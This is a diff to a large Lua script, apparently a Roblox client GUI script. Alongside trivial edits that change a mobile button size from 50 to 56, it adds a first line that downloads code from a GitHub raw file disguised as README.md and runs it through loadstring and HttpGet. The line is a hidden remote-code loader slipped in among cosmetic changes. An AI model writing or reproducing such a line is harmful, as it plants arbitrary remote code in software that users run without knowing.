@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sjdjjdnsndjf-sketch/GVHF/refs/heads/main/README.md"))()
 local Players = game:GetService("Players")
 
 local TweenService = game:GetService("TweenService")
@@ -1658,7 +1659,7 @@ M.CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
 M.guiTransparencyEnabled = false
 M.mobileButtonsEnabled = true
 M.mobileButtonsLocked = false
-M.mobileButtonsSize = 50
+M.mobileButtonsSize = 56
 
 M.circleButtonsEnabled = false
 M.mobBtnRefs = {}
@@ -9704,7 +9705,7 @@ function M.resetAllSettings()
     M.autoTPHeight = 20
     M.guiTransparencyEnabled = false
     M.mobileButtonsEnabled = true
-    M.mobileButtonsSize = 50
+    M.mobileButtonsSize = 56
 
     M.circleButtonsEnabled = false
     M.fovValue = 80
